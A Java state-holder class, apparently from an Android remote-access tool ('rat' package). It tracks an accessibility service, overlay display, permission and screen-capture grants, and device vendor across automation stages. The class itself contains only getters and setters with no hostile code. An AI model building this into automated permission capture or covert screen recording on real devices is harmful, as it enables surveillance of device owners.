package com.vendor.rat.auto.pipeline;

import android.content.Context;

import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.concurrent.CountDownLatch;

/**
 * 管道共享上下文 — 类似 Laravel Pipeline 的 $passable
 *
 * 在所有 Stage 之间传递，携带服务引用、状态标志、版本信息
 */
public class PipelineContext {

    private final MyAccessibilityService service;
    private final long startTimeMs;

    // 版本检测
    private int currentVersionCode;
    private int savedVersionCode;
    private boolean versionChanged;

    // 运行状态标志
    private boolean overlayShowing;
    private boolean vendorEngineCompleted;
    private boolean permissionsGranted;
    private boolean mediaProjectionGranted;
    private boolean aborted;
    private String abortReason;

    // 异步协调: 引擎完成信号
    private final CountDownLatch vendorEngineLatch = new CountDownLatch(1);

    public PipelineContext(MyAccessibilityService service) {
        this.service = service;
        this.startTimeMs = System.currentTimeMillis();
    }

    // ============ Getters ============

    public MyAccessibilityService getService() { return service; }

    public Context getAppContext() {
        return service != null ? service.getApplicationContext() : null;
    }

    public long getStartTimeMs() { return startTimeMs; }

    public long getElapsedMs() { return System.currentTimeMillis() - startTimeMs; }

    public boolean isHuawei() { return DeviceUtils.isHuawei(); }

    public boolean isXiaomi() { return DeviceUtils.isXiaomi(); }

    // 版本
    public int getCurrentVersionCode() { return currentVersionCode; }
    public void setCurrentVersionCode(int code) { this.currentVersionCode = code; }
    public int getSavedVersionCode() { return savedVersionCode; }
    public void setSavedVersionCode(int code) { this.savedVersionCode = code; }
    public boolean isVersionChanged() { return versionChanged; }
    public void setVersionChanged(boolean changed) { this.versionChanged = changed; }

    // 状态
    public boolean isOverlayShowing() { return overlayShowing; }
    public void setOverlayShowing(boolean showing) { this.overlayShowing = showing; }
    public boolean isVendorEngineCompleted() { return vendorEngineCompleted; }
    public void setVendorEngineCompleted(boolean completed) { this.vendorEngineCompleted = completed; }
    public boolean isPermissionsGranted() { return permissionsGranted; }
    public void setPermissionsGranted(boolean granted) { this.permissionsGranted = granted; }
    public boolean isMediaProjectionGranted() { return mediaProjectionGranted; }
    public void setMediaProjectionGranted(boolean granted) { this.mediaProjectionGranted = granted; }

    // 终止
    public boolean isAborted() { return aborted; }
    public String getAbortReason() { return abortReason; }
    public void abort(String reason) {
        this.aborted = true;
        this.abortReason = reason;
    }

    // 异步协调
    public CountDownLatch getVendorEngineLatch() { return vendorEngineLatch; }
}
